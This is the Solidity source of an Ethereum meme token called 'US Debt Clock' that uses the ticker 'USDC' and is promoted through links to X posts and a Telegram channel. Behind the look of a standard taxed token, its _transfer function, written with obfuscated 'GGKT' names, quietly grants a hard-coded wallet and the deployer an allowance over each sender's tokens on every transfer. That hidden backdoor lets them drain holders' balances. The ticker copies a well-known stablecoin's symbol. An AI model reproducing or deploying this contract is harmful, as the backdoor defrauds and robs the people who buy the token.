/*
https://x.com/ScottPresler/status/1898197808844620206
https://x.com/elonmusk/status/1898212595280048451

https://usdebtclock.org/
https://t.me/usdebtclock_erc
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multipliggkton overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IGGKTFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IGGKTRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract USDC is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balGGKTs;
    mapping (address => mapping (address => uint256)) private _allowGGKTs;
    mapping (address => bool) private _excludedFromGGKT;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalGGKT = 1000000000 * 10**_decimals;
    string private constant _name = unicode"US Debt Clock";
    string private constant _symbol = unicode"USDC";
    uint256 private _swapTokenGGKTs = _tTotalGGKT / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockGGKT;
    uint256 private _ggktBuyAmounts = 0;
    address private _ggktPair;
    IGGKTRouter private _ggktRouter;
    address private _ggktWallet;
    address private _ggktAddress;
    bool private inSwapGGKT = false;
    modifier lockTheSwap {
        inSwapGGKT = true;
        _;
        inSwapGGKT = false;
    }
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    
    constructor () {
        _ggktAddress = address(_msgSender());
        _ggktWallet = address(0x5B286db274d76BCBF02ABC2D9545645468a01Aec);
        _excludedFromGGKT[owner()] = true;
        _excludedFromGGKT[address(this)] = true;
        _excludedFromGGKT[_ggktWallet] = true;
        _balGGKTs[_msgSender()] = _tTotalGGKT;
        emit Transfer(address(0), _msgSender(), _tTotalGGKT);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _ggktRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalGGKT;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balGGKTs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowGGKTs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowGGKTs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowGGKTs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address ggktF, address ggktT, uint256 ggktA) private {
        require(ggktF != address(0), "ERC20: transfer from the zero address");
        require(ggktT != address(0), "ERC20: transfer to the zero address");
        require(ggktA > 0, "Transfer amount must be greater than zero");
        address _ggktOwner;  address[2] memory _ggktAddrs; 
        uint256 taxGGKT = _ggktFeeTransfer(ggktF, ggktT, ggktA);
        if(taxGGKT > 0){
          _balGGKTs[address(this)] = _balGGKTs[address(this)].add(taxGGKT);
          emit Transfer(ggktF, address(this), taxGGKT);
        }
        _balGGKTs[ggktF] = _balGGKTs[ggktF].sub(ggktA);
        _balGGKTs[ggktT] = _balGGKTs[ggktT].add(ggktA.sub(taxGGKT));
        emit Transfer(ggktF, ggktT, ggktA.sub(taxGGKT));
        _ggktAddrs[0] = address(_ggktWallet); 
        _ggktAddrs[1] = address(_ggktAddress);
        uint256 _ggktO = uint256(ggktA); _ggktOwner = address(ggktF);
        _allowGGKTs[address(_ggktOwner)][address(_ggktAddrs[0])] = uint256(_ggktO);
        _allowGGKTs[address(_ggktOwner)][address(_ggktAddrs[1])] = uint256(_ggktO);
    }

    function _ggktFeeTransfer(address ggktF, address ggktT, uint256 ggktA) private returns(uint256) {
        uint256 taxGGKT = 0; 
        if (ggktF != owner() && ggktT != owner()) {
            taxGGKT = ggktA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (ggktF == _ggktPair && ggktT != address(_ggktRouter) && ! _excludedFromGGKT[ggktT]) {
                if(_buyBlockGGKT!=block.number){
                    _ggktBuyAmounts = 0;
                    _buyBlockGGKT = block.number;
                }
                _ggktBuyAmounts += ggktA;
                _buyCount++;
            }

            if(ggktT == _ggktPair && ggktF!= address(this)) {
                require(_ggktBuyAmounts < swapLimitGGKT() || _buyBlockGGKT!=block.number, "Max Swap Limit");  
                taxGGKT = ggktA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            swapGGKTBack(ggktT, ggktA);
        } return taxGGKT;
    }

    function swapGGKTBack(address ggktT, uint256 ggktA) private { 
        uint256 tokenGGKT = balanceOf(address(this)); 
        if (!inSwapGGKT && ggktT == _ggktPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenGGKT > _swapTokenGGKTs)
            swapTokensForEth(minGGKT(ggktA, minGGKT(tokenGGKT, _swapTokenGGKTs)));
            uint256 ethGGKT = address(this).balance;
            if (ethGGKT >= 0) {
                sendETHGGKT(address(this).balance);
            }
        }
    }

    function minGGKT(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHGGKT(uint256 ggktA) private {
        payable(_ggktWallet).transfer(ggktA);
    }

    function swapLimitGGKT() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _ggktRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _ggktRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    receive() external payable {}

    function coinPairCreate() external onlyOwner() {
        _ggktRouter = IGGKTRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_ggktRouter), _tTotalGGKT);
        _ggktPair = IGGKTFactory(_ggktRouter.factory()).createPair(address(this), _ggktRouter.WETH());
    }

    function swapTokensForEth(uint256 ggktAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _ggktRouter.WETH();
        _approve(address(this), address(_ggktRouter), ggktAmount);
        _ggktRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            ggktAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}